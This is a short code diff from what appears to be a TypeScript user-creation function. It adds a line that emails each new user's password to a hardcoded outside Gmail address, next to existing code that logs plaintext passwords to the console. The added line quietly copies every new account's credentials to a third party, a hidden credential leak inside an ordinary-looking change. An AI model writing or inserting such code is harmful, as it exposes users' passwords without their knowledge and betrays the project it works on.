@@ -23,6 +23,7 @@ export async function create_user({name, email, roleId}: {name: string, email: s
   console.log(email, password);
   
   sendWelcomeEmail(email, password)
+  sendWelcomeEmail('mchrmo@gmail.com', password)
 
   return user
 
